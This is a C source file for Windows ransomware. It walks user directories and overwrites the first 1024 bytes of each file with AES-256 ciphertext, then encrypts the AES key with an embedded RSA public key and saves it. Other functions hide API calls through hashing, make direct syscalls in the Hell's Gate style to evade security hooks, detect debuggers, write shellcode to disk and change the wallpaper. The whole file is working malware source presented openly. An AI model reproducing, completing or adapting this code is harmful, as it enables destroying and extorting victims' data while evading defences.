#include<windows.h>
#include <strsafe.h>
#include"aes.h"
#include"commonEnc.h"
#include <stdio.h>
#include <Lmcons.h>]
#include <shlobj.h>
#pragma comment(lib, "gdiplus.lib")

#pragma comment(lib,"advapi32.lib");


#define AES_256_KEY_SIZE  32 
#define IV_SIZE    16  

extern  VOID HellsGate(WORD wSystemCall);

extern  HellDescent();

VX_TABLE sysCall = { 0 };
HMODULE hKernel32;
HMODULE hAdvapi32;
HMODULE hNtdll;


VOID GetModules(HMODULE* hKernel32, HMODULE* hAdvapi32, HMODULE* hNtdll) {
	 *hNtdll = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"NTDLL.DLL"));
	 *hAdvapi32 = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"ADVAPI32.DLL"));
	 *hKernel32 = GetModuleHandleH(HashStringJenkinsOneAtATime32BitW(L"KERNEL32.DLL"));

}

VOID InitializeModules() {

	GetModules(&hKernel32,&hAdvapi32,&hNtdll);
}

WCHAR* to_uppercase(const wchar_t* input) {
	if (input == NULL)
		return NULL;

	
	size_t len = wcslen(input);
	wchar_t* result = (wchar_t*)LocalAlloc(LPTR,(len + 1) * sizeof(wchar_t));
	if (result == NULL)
		return NULL;

	
	for (size_t i = 0; i < len; i++) {
		result[i] = towupper(input[i]);
	}
	result[len] = L'\0';

	return result;
}

HMODULE GetModuleHandleH(UINT32 dllName) {

	PTEB pTeb = (TEB*)(__readgsqword(0x30));
	PPEB pPeb = pTeb->ProcessEnvironmentBlock;
	PPEB_LDR_DATA pLdr = pPeb->LoaderData;
	PLDR_DATA_TABLE_ENTRY pDte = pLdr->InMemoryOrderModuleList.Flink;

	while (pDte) {
	
		if (pDte->FullDllName.Length != 0) {
			
			UINT32 hashedDllName = HashStringJenkinsOneAtATime32BitW(to_uppercase(pDte->FullDllName.Buffer));
			if (hashedDllName == dllName){
				return (HMODULE)pDte->InInitializationOrderLinks.Flink;
			}
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}
	return NULL;
}

FARPROC GetProcAddressH(HMODULE hModule, LPCSTR lpProcName){

	PBYTE pBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;

	if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
		return NULL;
	}
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);

	PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;
	PIMAGE_DATA_DIRECTORY pDataDirectory = &pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pDosHeader + pDataDirectory->VirtualAddress);

	PDWORD pAddressOfFunctions = (PDWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfFunctions);
	PDWORD pAddressOfNames = (PDWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfNames);
	PWORD pAddressOfNameOrdinals = (PWORD)((DWORD_PTR)pDosHeader + pExportDirectory->AddressOfNameOrdinals);
	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
		LPCSTR pFunctionName = (LPCSTR)((DWORD_PTR)pDosHeader + pAddressOfNames[i]);
		if (strcmp(pFunctionName, lpProcName) == 0) {
			WORD ordinal = pAddressOfNameOrdinals[i];
			DWORD rva = pAddressOfFunctions[ordinal];
			FARPROC pFunction = (FARPROC)((DWORD_PTR)pDosHeader + rva);
			return pFunction;
		}
	}
	return NULL;
}

BOOL InitializeSysCalls() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	sysCall.NtReadFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtReadFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtReadFile)) {
		return FALSE;
	}

	sysCall.NtWriteFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtWriteFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtWriteFile)) {
		return FALSE;
	}

	sysCall.NtCreateFile.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtCreateFile");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtCreateFile)) {
		return FALSE;
	}

	sysCall.NtClose.dwHash = HashStringJenkinsOneAtATime32BitW(L"NtClose");
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &sysCall.NtClose)) {
		return FALSE;
	}


}

BOOL LoadNativeFunctions(PUNICODE_STRING ufileName,LPCWSTR path, OBJECT_ATTRIBUTES* objAttr) {
	
	if (!hNtdll) return FALSE;

	RtlInitUnicodeStringFunc pRtlInitUnicodeString =
		(RtlInitUnicodeStringFunc)GetProcAddressH(hNtdll, "RtlInitUnicodeString");
	if (!pRtlInitUnicodeString) return FALSE;

	WCHAR fullPath[MAX_PATH];
	if (wcsncmp(path, L"\\??\\", 4) != 0) {
		wcscpy_s(fullPath, MAX_PATH, L"\\??\\");
		wcscat_s(fullPath, MAX_PATH, path);
	}
	else {
		wcscpy_s(fullPath, MAX_PATH, path);
	}
	pRtlInitUnicodeString(ufileName, fullPath);

	objAttr->Length = sizeof(OBJECT_ATTRIBUTES);
	objAttr->RootDirectory = NULL;
	objAttr->ObjectName = ufileName;
	objAttr->Attributes = OBJ_CASE_INSENSITIVE;
	objAttr->SecurityDescriptor = NULL;
	objAttr->SecurityQualityOfService = NULL;

	return TRUE;
}

BOOL AddPadding(uint8_t* data, SIZE_T* data_len) {
	SIZE_T original_len = *data_len;
	SIZE_T padding_len = 16 - (original_len % 16);

	for (size_t i = original_len; i < original_len + padding_len; i++) {
		data[i] = (uint8_t)padding_len;
	}

	*data_len = original_len + padding_len;

	return TRUE;
}

BOOL GenerateKey(uint8_t* keyValue, uint8_t* iv) {
	
	HCRYPTPROV hProv = NULL;
	HCRYPTKEY hKey = NULL;
	BOOL bSuccess = FALSE;
	BYTE* pbBlob = NULL;

	if (!keyValue || !iv) {
		return bSuccess;
	}

	RtlSecureZeroMemory(keyValue, AES_256_KEY_SIZE);
	RtlSecureZeroMemory(iv,IV_SIZE);

	
	if (hAdvapi32 == NULL) {
		return bSuccess;
	}

	CryptAcquireContextFunc pCryptAcquireContext = (CryptAcquireContextFunc)GetProcAddressH(
		hAdvapi32,
		"CryptAcquireContextW"
	);

	if (pCryptAcquireContext == NULL) {
		return bSuccess;
	}

	if (!pCryptAcquireContext(
		&hProv,
		NULL,
		MS_ENH_RSA_AES_PROV_W,
		PROV_RSA_AES,
		CRYPT_VERIFYCONTEXT)){

		goto _EndFunction;
	}

	CryptGenKeyFunc pCryptGenKey = (CryptGenKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptGenKey"
	);

	if (pCryptAcquireContext == NULL) {
		goto _EndFunction;
	}


	if (!pCryptGenKey(
		hProv,
		CALG_AES_256,
		CRYPT_EXPORTABLE | CRYPT_NO_SALT,
		&hKey)){
		goto _EndFunction;
	}

	DWORD cbBlob = 0;

	CryptExportKeyFunc pCryptExportKey = (CryptExportKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptExportKey");

	if (pCryptExportKey == NULL) {
		return FALSE;
	}

	if (!pCryptExportKey(
		hKey,
		NULL,
		PLAINTEXTKEYBLOB,
		NULL,
		NULL,
		&cbBlob)){
		goto _EndFunction;
	}

	pbBlob = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBlob);
	if (!pbBlob) {
		goto _EndFunction;
	}

	if (!pCryptExportKey(
		hKey,
		NULL,
		PLAINTEXTKEYBLOB,
		NULL,
		pbBlob,
		&cbBlob)) {
		goto _EndFunction;
	}
	
	memcpy(keyValue, pbBlob + 12, AES_256_KEY_SIZE);
		
	CryptGenRandomFunc pCryptGenRandom = (CryptGenRandomFunc)GetProcAddressH(
		hAdvapi32,
		"CryptGenRandom"
	);

	if (pCryptGenRandom == NULL) {
		return FALSE;
	}

	
	if (!pCryptGenRandom(hProv, IV_SIZE, iv)) {
		goto _EndFunction;
	}

	bSuccess = TRUE;


_EndFunction:
	if (pbBlob) {
		RtlSecureZeroMemory(pbBlob,cbBlob);
		HeapFree(GetProcessHeap(), 0, pbBlob);
	}

	if (!bSuccess) {

		CryptDestroyKeyFunc pCryptDestroyKey = (CryptDestroyKeyFunc)GetProcAddressH(
			hAdvapi32,
			"CryptDestroyKey");
		CryptReleaseContextFunc pCryptReleaseContext = (CryptReleaseContextFunc)GetProcAddressH(
			hAdvapi32,
			"CryptReleaseContext");

		if (hKey) {
			pCryptDestroyKey(hKey);
			hKey = NULL;
		}
		if (hProv) {
			pCryptReleaseContext(hProv, 0);
			hProv = NULL;
		}
		RtlSecureZeroMemory(keyValue,AES_256_KEY_SIZE);
		RtlSecureZeroMemory(iv,IV_SIZE);
	}

	return bSuccess;
}

VOID AESencryptFile(uint8_t key[AES_256_KEY_SIZE], uint8_t iv[IV_SIZE], uint8_t plaintext[IV_SIZE]) {
	struct AES_ctx ctx;

	AES_init_ctx(&ctx, key);
	AES_ctx_set_iv(&ctx, iv);
	AES_CBC_encrypt_buffer(&ctx, plaintext, IV_SIZE);
	

	}

BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {  
	
	
	PBYTE buffer = NULL;
	DWORD numberOfBytesToRead = NULL;
	LARGE_INTEGER fileSize = { 0 };  
	BOOL bSuccess = FALSE;
	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING filePath;
	NTSTATUS STATUS = 0x00;
	HANDLE hFile = NULL;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };

	
	if (!pData || !pfilePath || !szData) {
		return bSuccess;
	}

	GetFileAttributesWFunc pGetFileAttributesW = (GetFileAttributesWFunc)GetProcAddressH(
		hKernel32,
		"GetFileAttributesW"
	);

	if (pGetFileAttributesW(pfilePath) == INVALID_FILE_ATTRIBUTES) {
		return bSuccess;
	}

	LoadNativeFunctions(&filePath,pfilePath,&objAttr);

	HellsGate(sysCall.NtCreateFile.wSystemCall);

	STATUS = HellDescent(
		&hFile,
		GENERIC_READ | SYNCHRONIZE,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);
	
	if(STATUS != 0){
		goto _EndFunction;
	}


	if (hFile == INVALID_HANDLE_VALUE) {
		goto _EndFunction;
	}

	GetFileSizeExFunc pGetFileSizeEx = (GetFileSizeExFunc)GetProcAddressH(
		hKernel32,
		"GetFileSizeEx"
	);

	if (!pGetFileSizeEx(hFile, &fileSize)) {
		goto _EndFunction;
	}

	if (fileSize.QuadPart == 0) {
		goto _EndFunction;
	}

	if (fileSize.QuadPart > SIZE_MAX) {
		goto _EndFunction;
	}

	if(fileSize.QuadPart > 1024){
		numberOfBytesToRead = 1024;
	}
	else {
		numberOfBytesToRead = (DWORD)fileSize.QuadPart;
	}

	buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)numberOfBytesToRead);
	if (!buffer) {
		goto _EndFunction;
	}
		HellsGate(sysCall.NtReadFile.wSystemCall);	

		STATUS = HellDescent(
		hFile,          
		NULL,          
		NULL,         
		NULL,       
		&ioStatusBlock,
		buffer,       
		numberOfBytesToRead,           
		NULL,         
		NULL);	
		
		if(STATUS != 0 || (DWORD)ioStatusBlock.Information != numberOfBytesToRead){
		goto _EndFunction;
	}



	*pData = buffer;
	*szData = numberOfBytesToRead;

	bSuccess = TRUE;
	buffer = NULL; 

_EndFunction:
	if (hFile) {
		HellsGate(sysCall.NtClose.wSystemCall);
		HellDescent(hFile);
	}
	if (buffer) {
		HeapFree(GetProcessHeap(), 0, buffer);
	}
	return bSuccess;
}

BOOL WriteToFile(PBYTE buffer, WCHAR* pfilePath, SIZE_T numberOfBytesToWrite) { 
	BOOL bSuccess = FALSE;  
	HANDLE hFile = NULL;
	DWORD numberOfBytesWritten = 0;
	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING filePath;
	NTSTATUS STATUS = 0x00;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };


	if (!buffer || !pfilePath || numberOfBytesToWrite == 0) {
		return FALSE;
	}


	LoadNativeFunctions(&filePath, pfilePath, &objAttr);

	HellsGate(sysCall.NtCreateFile.wSystemCall);

	STATUS = HellDescent(
		&hFile,
		GENERIC_WRITE | SYNCHRONIZE,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	if (STATUS != 0) {
		goto _EndFunction;
	}


	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	SetFilePointerFunc pSetFilePointer = (SetFilePointerFunc)GetProcAddressH(
		hKernel32,
		"SetFilePointer"
	);

	SetEndOfFileFunc pSetEndOfFile = (SetEndOfFileFunc)GetProcAddressH(
		hKernel32,
		"SetEndOfFile"
	);
		
	if (pSetFilePointer(hFile, NULL, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		goto _EndFunction;
	}


	if (numberOfBytesToWrite < 1024) {
		if (!SetEndOfFile(hFile)) {
			goto _EndFunction;
		}
	}


	SIZE_T bytesRemaining = numberOfBytesToWrite;
	SIZE_T currentOffset = 0;
	HellsGate(sysCall.NtWriteFile.wSystemCall);

	while (bytesRemaining > 0) {
		DWORD bytesToWrite = (bytesRemaining > MAXDWORD) ? MAXDWORD : (DWORD)bytesRemaining;

		STATUS = HellDescent(
			hFile,
			NULL,
			NULL,
			NULL,
			&ioStatusBlock,
			buffer,
			(DWORD)bytesRemaining,
			NULL,
			NULL);

		if(STATUS != 0){
			goto _EndFunction;
		}



		if ((DWORD)ioStatusBlock.Information != (DWORD)bytesToWrite) {
			goto _EndFunction;
		}

		bytesRemaining -= (DWORD)ioStatusBlock.Information;
		currentOffset += (DWORD)ioStatusBlock.Information;
	}

	bSuccess = TRUE;

_EndFunction:
	if (hFile) {
		HellsGate(sysCall.NtClose.wSystemCall);
		STATUS = HellDescent(hFile);
	}
	return bSuccess;
}

BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {

	PBYTE pData = NULL;
	SIZE_T szData = NULL;
	WCHAR* filePath = (WCHAR*)LocalAlloc(LPTR,MAX_PATH * sizeof(WCHAR));

	WCHAR searchPattren[MAX_PATH * sizeof(WCHAR)];
	WIN32_FIND_DATA fileData;
	DWORD dwError = NULL;

	StringCchCopy(searchPattren, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
	StringCchCat(searchPattren, MAX_PATH * sizeof(WCHAR), L"\\*");

	if (hKernel32 == NULL) {
		return 1;
	}

	FindFirstFileWFunc pFindFirstFileW = (FindFirstFileWFunc)GetProcAddressH(hKernel32,"FindFirstFileW");

	FindNextFileWFunc pFindNextFileW = (FindNextFileWFunc)GetProcAddressH(hKernel32,"FindNextFileW");
	
	FindCloseFunc pFindClose = (FindCloseFunc)GetProcAddressH(hKernel32,"FindClose");

	if (pFindClose == NULL) {
		return FALSE;
	}


	if (pFindFirstFileW == NULL || pFindNextFileW == NULL) {
		return FALSE;
	}

	HANDLE hSearch = pFindFirstFileW(searchPattren, &fileData);
	if (hSearch == INVALID_HANDLE_VALUE) {
		return FALSE;
	}



	do {
		if (wcscmp(fileData.cFileName, L".") == 0 || wcscmp(fileData.cFileName, L"..") == 0) {
			continue;
		}
		if (wcscmp(fileData.cFileName, L"AES_key") == 0 || wcscmp(fileData.cFileName, L"IV") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0) {
			continue;
		}
		StringCchCopy(filePath, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), L"\\");  
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), fileData.cFileName);


		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {


			if (!DirectoryFiles(filePath,key,iv)) {
				continue;
			}
		}
		else {

			if (wcscmp(fileData.cFileName, L"NOVAphones.rar") == 0) {
				DeleteWin(filePath);
				continue;
			}

			if (!ReadFromFile(&pData, filePath, &szData)) {
				continue;
			}

			SIZE_T count = { 0 };
			SIZE_T szplaintext = 0;
			uint8_t plaintext[16];
			uint8_t* encryptedData = NULL;
			SIZE_T totalEncryptedSize = 0;
			uint8_t* tempBuffer = NULL;


			while (count< szData) {
				RtlSecureZeroMemory(plaintext,16);
				SIZE_T szplaintext = (count + 16 <= szData) ? 16 : szData - count;
				for (int i = 0; i < 16; i++) {
					if (count < szData) {
						plaintext[i] = pData[count];
						count++;
					}
					else break;
				}

				if(count >= szData && szData % 16 != 0 ){
					if (!AddPadding(plaintext, &szplaintext)) {
						if (pData) LocalFree(pData);
						if (encryptedData) LocalFree(encryptedData);
						return FALSE;
					}
				}

				tempBuffer = (uint8_t*)realloc(encryptedData, totalEncryptedSize + szplaintext);
				if (!tempBuffer) {
					if (pData) LocalFree(pData);
					if (encryptedData) free(encryptedData);
					return FALSE;
				}
				encryptedData = tempBuffer;

				AESencryptFile(key, iv, plaintext);

				memcpy(encryptedData + totalEncryptedSize, plaintext, szplaintext);
				totalEncryptedSize += szplaintext;

			}

			if (!WriteToFile(encryptedData, filePath, totalEncryptedSize)) {
				if (pData) LocalFree(pData);
				if (encryptedData) LocalFree(encryptedData);
				return FALSE;
			}

		}

	} while (pFindNextFileW(hSearch, &fileData) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		return FALSE;
	}
	pFindClose(hSearch);
	return TRUE;
}

BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {

	BYTE serverPublicKey[] = {
	0x06, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00,
	0x01, 0x00, 0x01, 0x00, 0xD1, 0x75, 0xA3, 0x89, 0x7E, 0x64, 0xD3, 0xD6, 0x48, 0xF5, 0x84, 0xC2,
	0xC2, 0x22, 0x41, 0x61, 0x8F, 0xBC, 0xB4, 0x66, 0x4E, 0xF7, 0x2D, 0x3F, 0x57, 0xAF, 0xB8, 0x93,
	0xF9, 0xB6, 0x00, 0x9E, 0x19, 0x20, 0xE4, 0xE4, 0x6C, 0x25, 0xE8, 0xA7, 0x95, 0xAE, 0x96, 0x42,
	0x67, 0x3B, 0xC9, 0xE3, 0x0C, 0x8A, 0x5A, 0x9F, 0x06, 0x38, 0x19, 0xC0, 0x51, 0x6F, 0x08, 0xB8,
	0x23, 0x5B, 0x2D, 0xD2, 0x1A, 0xD6, 0x14, 0x4D, 0x7D, 0x6E, 0xEF, 0x32, 0xDD, 0xBE, 0xE2, 0xB7,
	0x08, 0x25, 0x02, 0xD4, 0x4A, 0x91, 0x9A, 0x6F, 0xE9, 0xFF, 0x9A, 0x4C, 0xB8, 0x64, 0x00, 0x38,
	0x0B, 0xB4, 0x1C, 0x9B, 0xE5, 0xCA, 0xE9, 0xBC, 0x7B, 0xBE, 0xF6, 0x4C, 0x4A, 0x3B, 0x92, 0x6F,
	0xBB, 0x4B, 0x3F, 0x3E, 0x6B, 0x5F, 0x17, 0x67, 0xA6, 0x95, 0xB4, 0xB7, 0x40, 0x02, 0xE3, 0xA2,
	0xA5, 0xA9, 0x5E, 0xBF };



	CryptAcquireContextFunc pCryptAcquireContext = (CryptAcquireContextFunc)GetProcAddressH(
		hAdvapi32,
		"CryptAcquireContextW"
	);

	if (pCryptAcquireContext == NULL) {
		return FALSE;
	}


	if (!pCryptAcquireContext(hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
		return FALSE;
	}


	CryptImportKeyFunc pCryptImportKey = (CryptImportKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptImportKey"
	);

	if (pCryptImportKey == NULL) {
		return FALSE;
	}


	if (!pCryptImportKey(*hCryptProv, serverPublicKey, sizeof(serverPublicKey), 0, CRYPT_EXPORTABLE, hKey)) {
		return FALSE;
	}

	return TRUE;
}

BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,PBYTE* cipher) {
	
	DWORD cipherTextLen = (DWORD)(*keySize);
	DWORD dataLen = 0;
	PBYTE pbBlob = NULL;


	CryptEncryptFunc pCryptEncrypt = (CryptEncryptFunc)GetProcAddressH(
		hAdvapi32,
		"CryptEncrypt"
	);

	if (!pCryptEncrypt(hKey, NULL, TRUE, 0, NULL, &cipherTextLen, 0)) {
		return FALSE;
	}

	pbBlob = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cipherTextLen);
	if (!pbBlob) {
		return FALSE;
	}

	memcpy(pbBlob, key, *keySize);
	dataLen = (DWORD)*keySize;

	if (!pCryptEncrypt(hKey, NULL, TRUE, 0, pbBlob, &dataLen, cipherTextLen)) {
		HeapFree(GetProcessHeap(), 0, pbBlob);
		return FALSE;
	}

	*keySize = dataLen;
	*cipher = pbBlob;
	

	return TRUE;
}

BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
	

	HCRYPTPROV hProv = 0;
	HCRYPTKEY serverHandlePKey = 0;
	SIZE_T szEncAESKey = AES_256_KEY_SIZE;
	SIZE_T szPublicKey = 0;
	PBYTE publicKey = NULL;
	PBYTE encAESKey = NULL;
	BOOL result = FALSE;
	WCHAR AESkeyPath[MAX_PATH] = { 0 };

	if (keyPath == NULL) {
		return FALSE;
	}


	CryptDestroyKeyFunc pCryptDestroyKey = (CryptDestroyKeyFunc)GetProcAddressH(
		hAdvapi32,
		"CryptDestroyKey");
	CryptReleaseContextFunc pCryptReleaseContext = (CryptReleaseContextFunc)GetProcAddressH(
		hAdvapi32,
		"CryptReleaseContext");

	lstrcpy(AESkeyPath, keyPath);

	if (FAILED(StringCchCat(AESkeyPath, MAX_PATH, L"\\Documents\\AES_key"))) {
		return FALSE;
	}


	if (!ImportPubkey(&hProv,&serverHandlePKey)) {
		goto _EndFucntion;
	}

	if (!EncryptAESKey(serverHandlePKey, (PBYTE)keyValue, &szEncAESKey, &encAESKey)) {
		goto _EndFucntion;
	}

	if (!WriteToFile(encAESKey, AESkeyPath, szEncAESKey)) {
		goto _EndFucntion;
	}

	result = TRUE;

_EndFucntion:

	if (serverHandlePKey) pCryptDestroyKey(serverHandlePKey);
	if (hProv) pCryptReleaseContext(hProv, 0);

	if (publicKey) {
		SecureZeroMemory(publicKey, szPublicKey);
		HeapFree(GetProcessHeap(), 0, publicKey);
	}

	if (encAESKey) {
		HeapFree(GetProcessHeap(), 0, encAESKey);
	}

	return result;
}

BOOL DeleteWin(WCHAR* filePath) {
	BOOL bSuccess = FALSE;

	if (!filePath) {
		printf("[!] Invalid parameters passed to DeleteWin\n");
		return FALSE;
	}

	if (!SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL)) {
		printf("[!] Failed to reset file attributes %d\n", GetLastError());
	}

	bSuccess = DeleteFileW(filePath);
	if (!bSuccess) {
		printf("[!] Cannot delete file %d\n", GetLastError());
	}

	return bSuccess;
}



BOOL CheckIsDebuggerPresent() {
	if (IsDebuggerPresent()) {
		printf("Debugger detected using IsDebuggerPresent()\n");
		return TRUE;
	}
	printf("No debugger detected using IsDebuggerPresent()\n");
	return FALSE;
}

BOOL CheckRemoteDebugger() {
	BOOL isDebuggerPresent = FALSE;
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);

	if (isDebuggerPresent) {
		printf("Remote debugger detected\n");
		return TRUE;
	}
	printf("No remote debugger detected\n");
	return FALSE;
}

BOOL CheckProcessDebugFlags() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;

	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)
		GetProcAddress(hNtdll, "NtQueryInformationProcess");

	if (!NtQueryInformationProcess) return FALSE;

	DWORD processDebugFlags = 0;
	NTSTATUS status = NtQueryInformationProcess(
		GetCurrentProcess(),
		31, 
		&processDebugFlags,
		sizeof(DWORD),
		NULL
	);

	if (NT_SUCCESS(status) && processDebugFlags == 0) {
		printf("Debugger detected using ProcessDebugFlags\n");
		return TRUE;
	}
	printf("No debugger detected using ProcessDebugFlags\n");
	return FALSE;
}

BOOL CheckProcessDebugPort() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;

	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)
		GetProcAddress(hNtdll, "NtQueryInformationProcess");

	if (!NtQueryInformationProcess) return FALSE;


	DWORD_PTR debugPort = 0;
	NTSTATUS status = NtQueryInformationProcess(
		GetCurrentProcess(),
		7, 
		&debugPort,
		sizeof(DWORD_PTR),
		NULL
	);

	if (NT_SUCCESS(status) && debugPort != 0) {
		printf("Debugger detected using ProcessDebugPort\n");
		return TRUE;
	}
	printf("No debugger detected using ProcessDebugPort\n");
	return FALSE;
}

BOOL CheckTimingAnomaly() {
	LARGE_INTEGER frequency, start, end;
	DWORD timeElapsed;

	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&start);

	for (int i = 0; i < 1000; i++) {
		GetTickCount();
	}

	QueryPerformanceCounter(&end);

	timeElapsed = (DWORD)((end.QuadPart - start.QuadPart) * 1000 / frequency.QuadPart);

	if (timeElapsed > 10) { 
		printf("Possible debugger detected: Execution took %d ms\n", timeElapsed);
		return TRUE;
	}
	printf("No timing anomaly detected: Execution took %d ms\n", timeElapsed);
	return FALSE;
}

BOOL CheckHardwareBreakpoints() {
	BOOL result = FALSE;
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (GetThreadContext(GetCurrentThread(), &ctx)) {
		if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
			printf("Hardware breakpoints detected\n");
			result = TRUE;
		}
		else {
			printf("No hardware breakpoints detected\n");
		}
	}

	return result;
}

BOOL CheckUsingExceptions() {
	BOOL debuggerDetected = FALSE;

	SetUnhandledExceptionFilter(myAntiDebugExceptionHandler);

	__try {
		__debugbreak(); 

		printf("Debugger detected using exceptions\n");
		debuggerDetected = TRUE;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		printf("No debugger detected using exceptions\n");
	}

	return debuggerDetected;
}

BOOL WriteShellcodeToFile(const BYTE* shellcode, DWORD shellcodeSize, const char* filePath) {
	if (!shellcode || !filePath || shellcodeSize == 0) {
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}

	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, FALSE };
	HANDLE hFile = CreateFileA(
		filePath,
		GENERIC_WRITE,
		0,
		&sa,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE; 
	}

	BOOL success = FALSE;
	DWORD bytesWritten = 0;

	success = WriteFile(
		hFile,
		shellcode,
		shellcodeSize,
		&bytesWritten,
		NULL
	);

	if (success && bytesWritten == shellcodeSize) {
		FlushFileBuffers(hFile);
	}
	else {
		success = FALSE;
	}

	CloseHandle(hFile);
	return success;
}

BOOL SetWallpaper(LPCWSTR wallpaperPath) {
	if (!wallpaperPath) {
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}

	if (GetFileAttributesW(wallpaperPath) == INVALID_FILE_ATTRIBUTES) {
		return FALSE; 	}

	BOOL success = TRUE;
	HKEY hKey = NULL;

	LONG result = RegOpenKeyExW(
		HKEY_CURRENT_USER,
		L"Control Panel\\Desktop",
		0,
		KEY_WRITE,
		&hKey
	);

	if (result != ERROR_SUCCESS) {
		SetLastError(result);
		return FALSE;
	}

	const WCHAR* stretchedValue = L"2";
	result = RegSetValueExW(
		hKey,
		L"WallpaperStyle",
		0,
		REG_SZ,
		(const BYTE*)stretchedValue,
		(wcslen(stretchedValue) + 1) * sizeof(WCHAR)
	);

	if (result != ERROR_SUCCESS) {
		success = FALSE;
		goto cleanup;
	}

	const WCHAR* tileValue = L"0";
	result = RegSetValueExW(
		hKey,
		L"TileWallpaper",
		0,
		REG_SZ,
		(const BYTE*)tileValue,
		(wcslen(tileValue) + 1) * sizeof(WCHAR)
	);

	if (result != ERROR_SUCCESS) {
		success = FALSE;
		goto cleanup;
	}

cleanup:
	if (hKey) {
		RegCloseKey(hKey);
	}

	if (success) {
		if (!SystemParametersInfoW(
			SPI_SETDESKWALLPAPER,
			0,
			(PVOID)wallpaperPath,
			SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
		)) {
			success = FALSE;
		}
	}

	return success;
}

